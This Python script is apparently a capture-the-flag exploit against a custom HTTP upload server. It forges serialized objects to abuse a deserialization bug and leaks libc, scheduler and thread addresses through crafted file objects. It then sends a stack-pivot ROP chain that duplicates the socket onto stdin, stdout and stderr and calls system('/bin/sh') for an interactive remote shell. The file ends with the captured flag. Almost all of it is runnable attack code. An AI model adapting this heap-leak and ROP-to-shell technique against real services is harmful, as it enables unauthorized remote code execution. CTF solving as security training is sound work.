import base64
import hashlib
import http
import os
import random
import socket
import struct
import sys
import time
from urllib.parse import urlparse

import requests

BASEURL = "http://518e3baefd2283e3cde6d0ce8bebec7a.fileshare.fr:31337"; LOCAL=False
#BASEURL = "http://focal:31337"; LOCAL=True

uid = os.urandom(32).hex()


sess = requests.Session()
sess.auth = ("Kim-Jong-Un", "DoYouLikeMyCTF?")

r = sess.post(f"{BASEURL}/enroll/{uid}", data=base64.b64encode(b"test data"))
print(r, r.text)
time.sleep(1)

# Serialization exploit!
mask = (1 << 64) - 1
None_offset = (1<<63) | 1

def ser_string(offset, size, alloc):
    # alloc is the actual number of bytes copied, representing the actual length of the object
    return struct.pack("<QQQQ", 11, size, alloc, offset)

def ser_four(a=None_offset, b=None_offset, c=None_offset, d=None_offset):
    # Serialize four objects via collections_ListNode_http_Payload_val
    return struct.pack("<QQQQQ", 0x8f, a, b, c, d)

def append_string(payload, s):
    offset = len(payload) + 0x20
    payload += ser_string(len(payload) + 0x20, len(s), len(s) + 1)
    payload += s
    payload += b'\0'

def leak_with_file(address, size):
    payload = bytearray(ser_four())

    bits = urlparse(BASEURL)
    fid = os.urandom(32).hex()
    s = socket.create_connection((bits.hostname, bits.port))
    s.send(f"POST /upload/{uid}/{fid} HTTP/1.1\r\nHost: {bits.netloc}\r\nTransfer-Encoding: chunked\r\n\r\n".encode())

    count = 2

    # iovecs stored in an object of type 0x95 which doesn't have a deserializer
    iovec_off = len(payload)
    payload += struct.pack("<QQQQ",
        0x95, 0, # dummy first iovec
        address, size,
    ).ljust(0x150, b"S")

    str_off = len(payload)
    append_string(payload, b"\n")

    file_off = len(payload)
    payload += struct.pack("<QQB7xQBB2xIQQQQQQ",
        0x5b, # type = files_File
        None_offset, # path
        1, # writeable
        str_off, # _newline
        1, 1, 6, # _unsynced_data, _unsynced_metadata, _fd
        (1 << 63) + 0x4d, # _errno = FileOK
        0, count, count, iovec_off, # iov
        count, # iov_count
    )
    payload[:0x28] = ser_four(a=iovec_off, b=file_off)

    print(f"Leaking 0x{address:x} for 0x{size:x} bytes...")
    fid = os.urandom(32).hex()
    r = sess.post(f"{BASEURL}/upload/{uid}/{fid}", data=base64.b64encode(payload))

    # coax GC to collect the file object and run the destructor
    try:
        for i in range(8):
            sys.stdout.write(".")
            sys.stdout.flush()
            sess.get(f"{BASEURL}/")
            time.sleep(1)
        return s.recv(size)
    except requests.exceptions.ConnectionError as e:
        return e.args[0].args[1].args[0].encode("latin1")
    finally:
        print()
        s.close()
        time.sleep(1)

payload = b"\x00" * 400
fid = os.urandom(32).hex()
sess.post(f"{BASEURL}/upload/{uid}/{fid}", data=base64.b64encode(payload).ljust(0xfe0, b"="))

# cache values in case some leak step fails
if LOCAL:
    libc_base = 0x7fcb18caf000
    scheduler_addr = 0x7fcb18caee00
    thread_addr = 0x7fcb104ad640
else:
    libc_base = 0
    scheduler_addr = 0
    thread_addr = 0

if not libc_base:
    prog_data = leak_with_file(0x4b2fb8, 2720)
    libc_base = struct.unpack_from("<Q", prog_data, 0)[0] - (0x23f90 if LOCAL else 0x22dea)
    scheduler_addr = struct.unpack_from("<Q", prog_data, 0x4b3920 - 0x4b2fb8)[0]
    print(f"libc base: 0x{libc_base:x}")
    print(f"scheduler: 0x{scheduler_addr:x}")

if not thread_addr:
    scheduler = leak_with_file(scheduler_addr, 0x1c0)
    thread_addr = struct.unpack_from("<Q", scheduler, 0)[0]
    print(f"pthread_t: 0x{thread_addr:x}")

thread = leak_with_file(thread_addr - 0x400, 0x800)
print(f"thread:", thread.hex())

bucket7 = struct.unpack_from("<Q", thread, 0x2c0)[0]

rip = 0x0041197c # pop rax ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rdi = 0x0041f29c
pop_rsi = 0x004492b7
index = (bucket7 + 0x400 - 0x4af340) >> 3
system = 0x403480

# deserialized payload
payload = struct.pack("<Q", index)
payload += struct.pack("<QQ", 0, 0) # r14, r15
# ropchain via stack pivot
dup2 = libc_base + (0x10e8c0 if LOCAL else 0xbdbd0)
rop = [
    pop_rdi, 6,
    pop_rsi, 0,
    dup2,
    pop_rdi, 6,
    pop_rsi, 1,
    dup2,
    pop_rdi, 6,
    pop_rsi, 2,
    dup2,
    pop_rdi, bucket7 + 0x500,
    system
]
payload += struct.pack(f"<{len(rop)}Q", *rop)
objlen = len(payload)
# payload allocated to the first bucket
payload = base64.b64encode(payload)
assert len(payload) < 0x400
payload = payload.ljust(0x400, b"=")
payload += struct.pack("<QIIIIQQQQQ",
    bucket7 + 0x408,
    0xdeadbeef, objlen, # id, size
    0x1, 0x8, # field_count, field_offset
    0, # instance
    rip, rip, rip, rip, # trace, serialise_trace, serialise, deserialise
)
payload = payload.ljust(0x500, b"R")
payload += b"/bin/sh\0"
payload = payload.ljust(0xfe0, b"S")

bits = urlparse(BASEURL)
fid = os.urandom(32).hex()
s = socket.create_connection((bits.hostname, bits.port))
s.send(f"POST /upload/{uid}/{fid} HTTP/1.1\r\nHost: {bits.netloc}\r\nTransfer-Encoding: chunked\r\n\r\n".encode())

fid = os.urandom(32).hex()
s2 = socket.create_connection((bits.hostname, bits.port))
s2.send(f"POST /upload/{uid}/{fid} HTTP/1.1\r\nHost: {bits.netloc}\r\nAuthorization: Basic S2ltLUpvbmctVW46RG9Zb3VMaWtlTXlDVEY/\r\nContent-Length: {len(payload)}\r\n\r\n".encode())
s2.send(payload)
s2.settimeout(5)
try:
    s2.recv(1)
except socket.timeout:
    pass

from pwn import remote

remote.fromsocket(s).interactive()

# HXN{1f329793ed7d4b9b178de07eb257cfed}
